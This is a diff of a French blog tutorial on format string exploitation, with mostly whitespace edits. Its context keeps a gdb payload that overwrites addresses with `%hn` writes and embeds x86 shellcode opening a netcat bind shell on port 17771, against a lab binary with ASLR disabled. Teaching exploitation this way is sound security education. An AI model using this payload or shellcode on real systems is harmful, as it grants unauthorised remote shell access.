@@ -50,11 +50,9 @@ int main(int argc, char const *argv[])
 ```  
   
 L'exécution est simple:  
-![fmt1]({{ site.url }}/public/images/fmt/fmt1.png)
-
+![fmt1]({{ site.url }}/public/images/fmt/fmt1.png)  
 Fuzzons juste pour vérifier que le fgets fait bien son boulot et que nous évitons un débordement classique:  
-![fmt2]({{ site.url }}/public/images/fmt/fmt2.png)
-
+![fmt2]({{ site.url }}/public/images/fmt/fmt2.png)  
 Maintenant faisons un autre test:
 ```bash
 #python -c 'print "%x"*100' | ./simple
@@ -167,11 +165,7 @@ Program received signal SIGSEGV,
 Segmentation fault. 0x000a0009 in ?? () 
 ```
   
-Maintenant déterminons l'adresse précise de notre shellcode:
-```
-(gdb) r < <(python -c 'print "A" + "\x14\xa0\x04\x08" + "\x16\xa0\x04\x08" + "%65535x" + "%8$hn" + "%65535x" + "%7$hn" + "A"*50')
-```  
-  
+Maintenant déterminons l'adresse précise de notre shellcode:  
 ![fmt12]({{ site.url }}/public/images/fmt/fmt12.png)  
 **0xbffff26c** semble être un bon candidat. On ajoutera quelques NOPs également comme marge de manoeuvre, l'objectif étant de tomber dans nos NOPs et de slider jusqu'à notre shellcode.  
   
@@ -211,13 +205,10 @@ Nous adaptons donc notre payload et le testons sous gdb:
 ```
 (gdb) r < <(python -c 'print "A" + "\x14\xa0\x04\x08" + "\x16\xa0\x04\x08" + "%49142x" + "%8$hn" + "%12909x" + "%7$hn" + "\x90"*4 + "\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"')
 ```
-  
 ![fmt14]({{ site.url }}/public/images/fmt/fmt14.png)  
 Here we go, essayons de nous connecter:  
-
 ![fmt15]({{ site.url }}/public/images/fmt/fmt15.png)  
 Du coté de notre shellcode:  
-
 ![fmt16]({{ site.url }}/public/images/fmt/fmt16.png)  
 Nous pouvons donc en conclure qu'à partir d'un simple appel *printf*, il a été possible d'exécuter un bind shell. Bien évidemment ceci est un cas d'école et a été possible grâce à la désactivation de l'ASLR, rendant ainsi nos adresses prédictibles.
 
